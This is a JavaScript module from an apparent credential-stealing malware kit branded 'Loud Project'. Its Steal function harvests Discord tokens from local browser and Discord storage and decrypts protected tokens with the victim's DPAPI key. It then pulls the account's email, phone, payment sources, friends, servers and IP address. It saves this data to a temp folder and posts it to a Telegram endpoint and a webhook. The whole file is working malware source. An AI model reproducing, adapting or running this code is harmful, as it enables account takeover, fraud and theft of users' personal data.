const axios = require("axios");
const { paths } = require("../../data/paths");
const { getIp } = require("../utils/net");
const fs = require("fs");
const Dpapi = require("node-dpapi-prebuilt");
const crypto = require("crypto");
const { wbk, tlg, rdm } = require("../../data/Config");
const { state } = require("../../data/data");

async function Steal() {
  for (let path of paths) {
    await findToken(path);
  }
  for (let token of state.tokens) {
    const json = await axios
      .get("https://discord.com/api/v9/users/@me", {
        headers: {
          "Content-Type": "application/json",
          authorization: token,
        },
      })
      .then((response) => response.data)
      .catch(() => null);
    if (!json) continue;

    await takeGuilds(token);
    await takeBots(token);

    const ip = await getIp();
    const billing = await getBilling(token);
    const relationships = await getRelationships(token);
    if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\`, { recursive: true });
    fs.appendFileSync(
      process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\tokens.txt`,
      `==================================================\nIdentifier      : ${json.id}\nUsername        : ${json.username}\nPhone           : ${json.phone || "None"}\nE-Mail Address  : ${
        json.email || "None"
      }\nLocale          : ${json.locale}\nNitro           : ${
        json.premium_type === 1 ? "Nitro Classic" : json.premium_type === 2 ? "Nitro Boost" : json.premium_type === 3 ? "Nitro Basic" : "No nitro"
      }\nBadges          : ${getBadgesNames(json.flags)}\nBilling         : ${billing
        .replaceAll("`", "")
        .replaceAll("<:946246524504002610:962747802830655498>", "Paypal ")
        .replaceAll("<:bby:987692721613459517>", "Creditcard ")}\nToken           : ${token}\n==================================================\n\n`
    );

    axios
      .post(`${tlg}`, {
        text: `🚀 Loud Project | Discord Accounts\n\n👤 Username: ${json.username} (${json.id})\n🔑 Token: ${token}\n💎 Badges: ${getBadgesNames(json.flags)}\n🌐 Phone: ${
          json.phone || "None"
        }\n🔌 Nitro: ${json.premium_type === 1 ? "Nitro Classic" : json.premium_type === 2 ? "Nitro Boost" : json.premium_type === 3 ? "Nitro Basic" : "No nitro"}\n💳 Billing: ${billing
          .replaceAll("`", "")
          .replaceAll("<:946246524504002610:962747802830655498>", "PayPal ")
          .replaceAll("<:bby:987692721613459517>", "Creditcard ")}\n📩 Email: ${json.email}`,
      })
      .catch(() => null);
    axios
      .post(wbk, {
        avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
        username: "Loud Project",
        embeds: [
          {
            fields: [
              {
                name: `<a:bby:987689940852817971> Token:`,
                value: `\`${token}\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
                inline: false,
              },
              {
                name: `<:bby:987689933844127804> Badges:`,
                value: getBadges(json.flags),
                inline: true,
              },
              {
                name: `<:bby:987689935018549328> Nitro Type:`,
                value: await getNitro(json.premium_type, json.id, token),
                inline: true,
              },
              {
                name: `<a:bby:987689939401588827> Billing:`,
                value: billing,
                inline: true,
              },
              {
                name: `<:bby:987689943558135818> Email:`,
                value: `\`${json.email}\``,
                inline: true,
              },
              {
                name: `<:bby:987689942350196756> IP:`,
                value: `\`${ip}\``,
                inline: true,
              },
            ],
            color: 13172927,
            author: {
              name: `${json.username} (${json.id})`,
              icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
            },
            footer: {
              text: "Loud Project | https://t.me/LoudProject",
            },
            thumbnail: {
              url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
            },
          },
          {
            color: 13172927,
            description: relationships.friends,
            author: {
              name: `HQ Friends (${relationships.length})`,
              icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
            },
            footer: {
              text: "Loud Project | https://t.me/LoudProject",
            },
          },
        ],
      })
      .catch(() => null);
  }
}

async function findToken(path) {
  const path_tail = path;
  path += "\\Local Storage\\leveldb";

  if (!path_tail.includes("discord")) {
    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs
            .readFileSync(path + "\\" + file, "utf8")
            .split(/\r?\n/)
            .forEach((line) => {
              const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];

              for (const pattern of patterns) {
                const foundTokens = line.match(pattern);

                if (foundTokens.length)
                  foundTokens.forEach((token) => {
                    if (!state.tokens.includes(token)) state.tokens.push(token);
                  });
              }
            });
      });
    } catch {}
  } else {
    if (!fs.existsSync(path_tail + "\\Local State")) return;

    try {
      fs.readdirSync(path).map((file) => {
        (file.endsWith(".log") || file.endsWith(".ldb")) &&
          fs
            .readFileSync(path + "\\" + file, "utf8")
            .split(/\r?\n/)
            .forEach((line) => {
              const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g);
              const foundTokens = line.match(pattern);

              if (foundTokens) {
                foundTokens.forEach((token) => {
                  const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "\\Local State")).os_crypt.encrypted_key, "base64").subarray(5);
                  const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");

                  token = Buffer.from(token.split("dQw4w9WgXcQ:")[1], "base64");

                  const start = token.slice(3, 15);
                  const middle = token.slice(15, token.length - 16);
                  const end = token.slice(token.length - 16, token.length);
                  const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);

                  decipher.setAuthTag(end);

                  const finalToken = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
                  if (!state.tokens.includes(finalToken)) state.tokens.push(finalToken);
                });
              }
            });
      });
    } catch (e) {
      console.log(e);
    }
  }
}

async function takeGuilds(token) {
  const guilds = await axios
    .get("https://discord.com/api/v9/users/@me/guilds", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);
  if (!guilds || !Array.isArray(guilds) || !guilds.length) return;

  const guild_str = "GUILDS FROM: " + token + "  #LoudProject\n\n" + guilds.map((g) => `GUILD_NAME: ${g.name} - GUILD_ID: ${g.id} - GUILD_OWNER: ${g.owner ? "Yes" : "No"}`).join("\n");
  if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\`, { recursive: true });
  fs.appendFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\guilds.txt`, guild_str + "\n\n");
}

async function takeBots(token) {
  const bots = await axios
    .get("https://discord.com/api/v9/applications?with_team_applications=true", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);
  if (!bots || !Array.isArray(bots) || !bots.length) return;

  const certif = {
    1: "No",
    2: "Eligible",
    3: "In progress",
    4: "Yes",
  };

  const bots_str =
    "BOTS FROM: " +
    token +
    "  #LoudProject\n\n" +
    bots
      .map(
        (c) =>
          `BOT: ${c.bot.username} (${c.bot.id}) - BOT_OWNER: ${c.owner.username}#${c.owner.discriminator} (${c.owner.id}) - CERTIFIED_BOT: ${certif[c.verification_state]} - PUBLIC_BOT: ${
            c.bot_public ? "Yes" : "No"
          }`
      )
      .join("\n");
  if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\`, { recursive: true });
  fs.appendFileSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Discord\\bots.txt`, bots_str + "\n\n");
}

async function getRelationships(token) {
  const json = await axios
    .get("https://discord.com/api/v9/users/@me/relationships", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);

  if (!json || !Array.isArray(json)) return "*Account locked*";
  if (!json.length) return "*No Rare Friends*";

  const friends = json.filter((user) => user.type == 1);
  let final = "";

  for (const friend of friends) {
    const badges = getRareBadges(friend.user.public_flags);
    if (badges) final += `${badges} | \`${friend.user.username}\`\n`;
  }

  return {
    length: friends.length,
    friends: final || "*No Rare Friends*",
  };
}
async function getBilling(token) {
  const json = await axios
    .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    })
    .then((response) => response.data)
    .catch(() => null);

  if (!json || !Array.isArray(json)) return "`Unknown`";
  if (!json.length) return "`No Billing`";

  let billings = "";

  for (const billing of json) {
    if (billing.type == 2 && billing.invalid != !0) {
      billings += "<:946246524504002610:962747802830655498>";
    } else if (billing.type == 1 && billing.invalid != !0) {
      billings += "<:bby:987692721613459517>";
    }
  }

  return billings || "`No Billing`";
}

function getBadges(flags) {
  let Badges = "";

  for (const prop in badges) {
    const badge = badges[prop];
    if ((flags & badge.Value) == badge.Value) Badges += badge.Emoji;
  }

  return Badges || "`No Badges`";
}

function getBadgesNames(flags) {
  let Badges = [];

  for (const prop in badges) {
    const badge = badges[prop];
    if ((flags & badge.Value) == badge.Value) Badges.push(prop);
  }

  return Badges.length ? Badges.join(", ") : "No Badges";
}

function getRareBadges(flags) {
  let Badges = "";

  for (const prop in badges) {
    const badge = badges[prop];
    if ((flags & badge.Value) == badge.Value && badge.Rare) Badges += badge.Emoji;
  }

  return Badges;
}

async function getNitro(flags, id, token) {
  switch (flags) {
    case 1:
      return "<:946246402105819216:962747802797113365>";
    case 2:
      const info = await axios
        .get(`https://discord.com/api/v9/users/${id}/profile`, {
          headers: {
            "Content-Type": "application/json",
            authorization: token,
          },
        })
        .then((response) => response.data)
        .catch(() => null);
      if (!info || !info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

      const boost = [
        "<:Booster1Month:1223996099027669064>",
        "<:Booster2Month:1223996099887501456>",
        "<:Booster3Month:1223996517250236519>",
        "<:Booster6Month:1223996101195989103>",
        "<:Booster9Month:1223996102810796182>",
        "<:Booster12Month:1223996719574814740>",
        "<:Booster15Month:1223996104044183563>",
        "<:BoosterLevel8:1223996106875207791>",
        "<:Booster24Month:1223996105549680742>",
      ];
      let i = 0;

      try {
        const d = new Date(info.premium_guild_since);
        const boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000);
        const d1 = new Date(info.premium_guild_since);
        const boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000);
        const d2 = new Date(info.premium_guild_since);
        const boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000);
        const d3 = new Date(info.premium_guild_since);
        const boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000);
        const d4 = new Date(info.premium_guild_since);
        const boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000);
        const d5 = new Date(info.premium_guild_since);
        const boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000);
        const d6 = new Date(info.premium_guild_since);
        const boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000);
        const d7 = new Date(info.premium_guild_since);
        const boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000);

        if (boost2month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost3month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost6month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost9month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost12month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost15month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost18month > 0) {
          i += 0;
        } else {
          i += 1;
        }
        if (boost24month > 0) {
          i += 0;
        } else if (boost24month < 0 || boost24month == 0) {
          i += 1;
        } else {
          i = 0;
        }
      } catch {}

      return `<:946246402105819216:962747802797113365> ${boost[i]}`;
    case 3:
      return "<:946246402105819216:962747802797113365>";
    default:
      return "`No Nitro`";
  }
}

const badges = {
  Discord_Employee: {
    Value: 1,
    Emoji: "<:staff:874750808728666152>",
    Rare: true,
  },
  Partnered_Server_Owner: {
    Value: 2,
    Emoji: "<:partner:874750808678354964>",
    Rare: true,
  },
  HypeSquad_Events: {
    Value: 4,
    Emoji: "<:hypesquad_events:874750808594477056>",
    Rare: true,
  },
  Bug_Hunter_Level_1: {
    Value: 8,
    Emoji: "<:bughunter_1:874750808426692658>",
    Rare: true,
  },
  Early_Supporter: {
    Value: 512,
    Emoji: "<:early_supporter:874750808414113823>",
    Rare: true,
  },
  Bug_Hunter_Level_2: {
    Value: 16384,
    Emoji: "<:bughunter_2:874750808430874664>",
    Rare: true,
  },
  Early_Verified_Bot_Developer: {
    Value: 131072,
    Emoji: "<:developer:874750808472825986>",
    Rare: true,
  },
  House_Bravery: {
    Value: 64,
    Emoji: "<:bravery:874750808388952075>",
    Rare: false,
  },
  House_Brilliance: {
    Value: 128,
    Emoji: "<:brilliance:874750808338608199>",
    Rare: false,
  },
  House_Balance: {
    Value: 256,
    Emoji: "<:balance:874750808267292683>",
    Rare: false,
  },
  Discord_Official_Moderator: {
    Value: 262144,
    Emoji: "<:moderator:976739399998001152>",
    Rare: true,
  },
};

module.exports = { Steal };
